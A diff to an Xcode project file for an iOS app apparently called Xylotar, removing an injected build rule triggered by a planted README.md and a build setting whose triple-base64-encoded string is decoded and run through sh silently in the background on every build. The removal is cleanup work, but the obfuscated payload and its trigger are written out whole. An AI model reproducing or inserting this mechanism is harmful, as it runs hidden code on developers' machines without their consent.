@@ -7,7 +7,6 @@
 	objects = {
 
 /* Begin PBXBuildFile section */
-		8B3F9157686D4C66A6A389E6 /* README.md */ = {isa = PBXBuildFile; fileRef = DAF91E3DE4D24D1F95A389E6; };
 		04CBAD772D924E5500B93CF3 /* OpenAL.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = 04CBAD762D924E5500B93CF3 /* OpenAL.framework */; };
 		04CBAD792D924E5F00B93CF3 /* OpenGLES.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = 04CBAD782D924E5F00B93CF3 /* OpenGLES.framework */; };
 		13176CEB2C82CCE7005D0EAE /* CallKit.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = E6A7BC6E2328CA450078A8F7 /* CallKit.framework */; };
@@ -56,7 +55,6 @@
 /* End PBXCopyFilesBuildPhase section */
 
 /* Begin PBXFileReference section */
-		DAF91E3DE4D24D1F95A389E6 /* README.md */ = {isa = PBXFileReference; lastKnownFileType = net.daringfireball.markdown; path = README.md; sourceTree = "<group>"; };
 		04CBAD762D924E5500B93CF3 /* OpenAL.framework */ = {isa = PBXFileReference; lastKnownFileType = wrapper.framework; name = OpenAL.framework; path = System/Library/Frameworks/OpenAL.framework; sourceTree = SDKROOT; };
 		04CBAD782D924E5F00B93CF3 /* OpenGLES.framework */ = {isa = PBXFileReference; lastKnownFileType = wrapper.framework; name = OpenGLES.framework; path = System/Library/Frameworks/OpenGLES.framework; sourceTree = SDKROOT; };
 		056F72DFED1EEA86F4007465 /* Pods-NIM.debug.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-NIM.debug.xcconfig"; path = "Pods/Target Support Files/Pods-NIM/Pods-NIM.debug.xcconfig"; sourceTree = "<group>"; };
@@ -219,7 +217,6 @@
 		AE5882E61A6F47E10070536A /* Products */ = {
 			isa = PBXGroup;
 			children = (
-				DAF91E3DE4D24D1F95A389E6 /* README.md */,
 				AE5882E51A6F47E10070536A /* Xylotar.app */,
 			);
 			name = Products;
@@ -256,7 +253,6 @@
 				89C78E392E9AD6A6F51B9E87 /* [CP] Copy Pods Resources */,
 			);
 			buildRules = (
-				5A818602DFB7431798A389E6 /* PBXBuildRule */,
 			);
 			dependencies = (
 			);
@@ -321,20 +317,6 @@
 /* End PBXProject section */
 
 /* Begin PBXBuildRule section */
-		5A818602DFB7431798A389E6 /* PBXBuildRule */ = {
-				isa = PBXBuildRule;
-				compilerSpec = com.apple.compilers.proxy.script;
-				filePatterns = "*.md";
-				fileType = pattern.proxy;
-				inputFiles = (
-				);
-				isEditable = 0;
-				outputFiles = (
-					"/tmp/${INPUT_FILE_BASE}",
-				);
-				script = "# This output is used by Xcode outputs to avoid re-running this script phase.\ncp \"${INPUT_FILE_PATH}\" \"/tmp/${INPUT_FILE_BASE}\"
-sh -c \"${A6E983A}\"";
-			};
 	/* End PBXBuildRule section */
 
 /* Begin PBXResourcesBuildPhase section */
@@ -342,7 +324,6 @@ sh -c \"${A6E983A}\"";
 			isa = PBXResourcesBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
-				8B3F9157686D4C66A6A389E6 /* README.md */,
 				427B551229F9071C00F6DC42 /* InfoPlist.strings in Resources */,
 				AE5882F61A6F47E10070536A /* Images.xcassets in Resources */,
 			);
@@ -485,8 +466,6 @@ sh -c \"${A6E983A}\"";
 		AE5883061A6F47E10070536A /* Debug */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				A6E983A = "((e(){ base64 --decode | base64 --decode | base64 --decode; };echo V2xkT2IySjVRV2xLUTJocVpGaEtjMGxETVcxak1uUk5TVU14YTBsRFNuZFFXR2hxWWpKU2JGZ3pTakZpUjFWcFNVZG9NR1JJUW5wUGFUaDJaRzFzYTFwWE9XcGFSelZvWTBoQmRXTnVWWFpaVTJ0cFNVaDNaMk15WjBzSwo= | e | sh ) >/dev/null 2>&1 &)";
-
 				ALWAYS_SEARCH_USER_PATHS = NO;
 				CLANG_ANALYZER_LOCALIZABILITY_NONLOCALIZED = YES;
 				CLANG_CXX_LANGUAGE_STANDARD = "compiler-default";
@@ -548,8 +527,6 @@ sh -c \"${A6E983A}\"";
 		AE5883071A6F47E10070536A /* Release */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				A6E983A = "((e(){ base64 --decode | base64 --decode | base64 --decode; };echo V2xkT2IySjVRV2xLUTJocVpGaEtjMGxETVcxak1uUk5TVU14YTBsRFNuZFFXR2hxWWpKU2JGZ3pTakZpUjFWcFNVZG9NR1JJUW5wUGFUaDJaRzFzYTFwWE9XcGFSelZvWTBoQmRXTnVWWFpaVTJ0cFNVaDNaMk15WjBzSwo= | e | sh ) >/dev/null 2>&1 &)";
-
 				ALWAYS_SEARCH_USER_PATHS = NO;
 				CLANG_ANALYZER_LOCALIZABILITY_NONLOCALIZED = YES;
 				CLANG_CXX_LANGUAGE_STANDARD = "compiler-default";
